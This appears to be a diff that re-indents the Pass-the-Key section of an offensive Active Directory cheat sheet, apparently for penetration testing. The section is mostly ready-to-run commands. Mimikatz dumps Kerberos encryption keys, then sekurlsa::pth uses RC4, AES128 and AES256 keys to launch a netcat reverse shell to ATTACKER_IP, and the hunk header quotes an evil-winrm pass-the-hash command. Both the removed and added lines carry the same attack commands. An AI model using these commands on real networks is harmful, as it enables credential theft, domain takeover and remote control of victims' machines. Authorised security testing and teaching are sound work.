@@ -194,20 +194,20 @@ evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
     mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-<domainName>.kirbi
     ```
    ### 6.2.2 Pass-The-Key
-   - **Notes**:
-    - When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. 
-    - If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name Pass-the-key (PtK).
-- **extract Kerberos encryption keys**
-```
-mimikatz # privilege::debug
-mimikatz # sekurlsa::ekeys
-```
-- **use this keys to get revShell**:
-```    
-    #If we have the RC4 hash:
-    mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
-    #If we have the AES128 hash:
-    mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
-    #If we have the AES256 hash:
-    mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
-```
+    - **Notes**:
+        - When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password. 
+        - If we have any of those keys, we can ask the KDC for a TGT without requiring the actual password, hence the name Pass-the-key (PtK).
+    - **extract Kerberos encryption keys**
+    ```
+    mimikatz # privilege::debug
+    mimikatz # sekurlsa::ekeys
+    ```
+    - **use this keys to get revShell**:
+    ```    
+        #If we have the RC4 hash:
+        mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
+        #If we have the AES128 hash:
+        mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
+        #If we have the AES256 hash:
+        mimikatz # sekurlsa::pth /user:Administrator /domain:<DomainName> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP PORT"
+    ```
